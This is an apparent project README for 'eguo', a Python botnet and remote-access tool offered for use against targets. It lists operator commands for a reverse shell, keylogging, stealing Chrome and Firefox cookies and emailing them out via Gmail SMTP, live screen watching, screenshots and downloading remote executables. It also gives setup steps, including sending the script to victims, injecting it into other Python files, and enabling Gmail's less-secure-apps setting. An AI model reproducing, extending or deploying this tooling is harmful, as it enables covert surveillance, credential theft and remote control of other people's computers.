# eguo
reverse shell _ botnet _ zombie network (keylogger,IP_info_location,screenSher_RD_screen_shoter_reverse_commandes)


eguo it's a botnet that can handle many connections 


eguo will let you run commandes to the targets machine and it will let you to run one command to all machine and  you can control one target if you want 


it will give you reverse shell and keylogger and ip info with locathion and it can get screen shots of the targets machine and it can download files and it give you screen share to the targets machine  (like rdp but without conrtol just seeing what the target doing ) and it get the targets browser cookies firefox or chrome and it allows connected 

how to install

pip3 install -r requirements.txt

you can inject it in any python file 

how to run

send the eguo.py to the targets 

run  eguo_eare.py in your server

| Command | Description |
| --- | --- |
| `1 or accept` | to accept the connection  |
| `2 or list` | to list all targets |
| `connect id or 3 (then id)` | to connect to spesfic target |
| `4 or zommbe` | to connect to all targets |
| `5 or exit` | to exit |

| Command | Description |
| --- | --- |
| `cookies-chrome yourEmail@gmail.com` | it get the chrome cookies and send it to your email |
| `cookies-firefox` | it get the chrome cookies and send it to your email |
| `keylog` | it get the Keystroke logs and send it to your email it will not end antel the user type '~' you can edit it in line 37 |
| `screensher` | it will show you what the target do like video converse   |
| `ip-info` | it give you sum info about his ip  |
| `dfile https://www.url.com/me.exe` | it will download the file from the url |
| `screenshot` | it give you screen shot of the target screen   |

 we are using gmail smtp you will need to allow https://myaccount.google.com/lesssecureapps

and you ned to edit  egou.py

add you ip and port in line 13 14
and you need to add gmail account and pass after allowing the lesssecureapps  in line 16 17

:)
